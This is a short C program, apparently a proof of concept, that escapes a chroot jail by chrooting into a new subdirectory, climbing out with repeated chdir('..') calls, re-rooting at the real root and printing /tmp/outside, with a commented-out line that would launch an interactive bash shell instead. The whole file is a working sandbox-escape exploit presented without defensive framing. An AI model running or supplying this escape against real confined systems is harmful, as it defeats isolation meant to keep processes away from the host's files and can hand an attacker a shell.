#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
        mkdir(".breakout", 0755);
        chroot(".breakout");
        // This line also works but it seems more elegant to just use a for loop
        //chroot("../../../../../../../../../../../../../../../..");
        int x;
        for(x = 0; x < 1000; x++){
                chdir("..");
        }

        chroot(".");
	print_file_contents("/tmp/outside");
	return 0;
       // return execl("/bin/bash", "-i", NULL);
}

int print_file_contents(char *filename){
        int c;
        FILE *file;
        file = fopen(filename, "r");
        if (file) {
        while ((c = getc(file)) != EOF)
                putchar(c);
        fclose(file);
        }
}
